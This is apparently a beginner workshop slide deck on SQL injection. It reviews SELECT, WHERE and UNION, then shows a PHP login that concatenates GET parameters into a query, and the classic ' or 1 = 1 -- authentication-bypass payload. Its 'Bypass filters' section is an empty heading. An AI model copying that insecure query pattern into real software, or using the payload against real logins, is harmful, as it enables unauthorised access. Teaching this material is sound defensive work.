class: middle

.center.responsive[
![Logo](https://imgur.com/JR7UeOu.jpg)]

---

# Baby' or 1=1 -- first SQL Injection

### 🔧 SQL Basics

???

Who's not familiar with SQL? 

(something something Structured Query Language)

--

### 💉 What is an SQLi?

--

### 💣 How to exploit?

--

### 🔥 Bypass filters

---

## 🔧 SQL Basics - SELECT

```SQL
SELECT 1337;
+------+
| 1337 |
+------+
| 1337 |
+------+
```

--

```SQL
SELECT 1337 AS username;
+----------+
| username |
+----------+
|     1337 |
+----------+
```

--

```SQL
SELECT 2 + 2 AS email;
+-------+
| email |
+-------+
|     4 |
+-------+
```

---

## 🔧 SQL Basics - FROM

```SQL
SELECT * FROM users;
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationdate | email                     |
+--------+-------------+------------------+---------------------------+
|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
+--------+-------------+------------------+---------------------------+
```

--

```SQL
SELECT username, email FROM users;
+-------------+------------------------------------+
| username    | email                              |
+-------------+------------------------------------+
| lredington0 | casey0@noaa.gov                    |
| fmalicki1   | jhannah1@gravatar.com              |
| lbrook2     | latkin2@theatlantic.com            |
+-------------+------------------------------------+
```

---

## 🔧 SQL Basics - WHERE

```SQL
SELECT * FROM users WHERE email = 'casey0@noaa.gov';
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationDate | email                     |
+--------+-------------+------------------+---------------------------+
|      1 | lredington0 | 2018-02-06       | casey0@noaa.gov           |
+--------+-------------+------------------+---------------------------+
```

--


```SQL
SELECT * FROM users WHERE email LIKE '%.com';
+--------+-------------+------------------+---------------------------+
| userid | username    | registrationDate | email                     |
+--------+-------------+------------------+---------------------------+
|      2 | fmalicki1   | 2017-10-11       | jhannah1@gravatar.com     |
|      3 | lbrook2     | 2016-06-14       | latkin2@theatlantic.com   |
+--------+-------------+------------------+---------------------------+
```

---

## 🔧 SQL Basics - UNION

```SQL
SELECT username, email FROM users WHERE userid = 1 
UNION 
SELECT username, email FROM users WHERE userid = 3;
+-------------+-------------------------+
| username    | email                   |
+-------------+-------------------------+
| lredington0 | casey0@noaa.gov         |
| lbrook2     | latkin2@theatlantic.com |
+-------------+-------------------------+
```

--

```SQL
SELECT username, email FROM users WHERE userid = 1 
UNION 
SELECT 'hello' AS username, 'world' AS email;
+-------------+-------------------------+
| username    | email                   |
+-------------+-------------------------+
| lredington0 | casey0@noaa.gov         |
| hello       | world                   |
+-------------+-------------------------+
```

---

# 💉 What is an SQLi?

```PHP
<?php
...
$user = $_GET['username'];
$pass = $_GET['password'];
$sql = "SELECT * FROM users"
     . "WHERE username = '" . $user . "' AND password = '" . $pass . "';"
...
```

--

`GET /index.php?username=filedesless&password=hunter2`

```SQL
SELECT * FROM users
WHERE username = 'filedesless' AND password = 'hunter2';
```

--

what if someone puts a squiggly boi (') in there?

--

```SQL
SELECT * FROM users
WHERE username = ''' AND password = 'hunter2';
```

`Error Code: 1064. You have an error in your SQL syntax  near 'hunter2'' at line 2`

---

.responsive[![squiggly boi](https://i.imgur.com/LtQWQXm.jpg)]

---

# 💣 How to exploit?


```SQL
SELECT * FROM users
WHERE username = '' or 1 = 1 -- ' AND password = '';
```

---

# 🔥 Bypass filters
